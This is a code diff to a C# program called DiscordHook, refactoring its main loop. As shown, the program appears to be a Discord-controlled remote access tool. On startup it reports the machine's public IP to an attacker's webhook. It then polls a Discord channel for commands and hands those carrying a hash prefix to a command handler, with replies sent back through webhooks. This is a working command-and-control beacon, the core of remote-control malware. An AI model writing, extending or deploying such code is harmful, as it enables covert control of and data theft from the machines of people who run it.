@@ -1,5 +1,4 @@
-﻿using System;
-using System.Threading.Tasks;
+﻿using System.Threading.Tasks;
 using static DiscordHook.Alerts;
 using static DiscordHook.DiscordApi;
 using static DiscordHook.CommandHandler;
@@ -24,19 +23,23 @@ namespace DiscordHook
             await Task.Delay(500);
 
             await SendHookAlertAsync(await GetIpAsync(), alerthook, hashprefix);
+            var save = true;
 
             while (true)
             {
                 await Task.Delay(1000);
                 var command = await GetCommand(botToken, channelurl);
-                if (command == "ping")
+                switch (command)
                 {
-                    await SendHookAlertAsync(await GetIpAsync(), alerthook, hashprefix);
-                    await SendStringHook("null", alerthook);
+                    case "ping" when save:
+                        await SendHookAlertAsync(await GetIpAsync(), alerthook, hashprefix);
+                        save = false;
+                        break;
+                    case "null":
+                        save = true;
+                        continue;
                 }
-                    
-                if (command == "null" || !command.Contains(hashprefix) ) continue;
-                await HandleCmd(command.Substring(65), replyhook, commandhook);
+                if (command.Contains(hashprefix) ) await HandleCmd(command.Substring(65), replyhook, commandhook);
             }
 
             
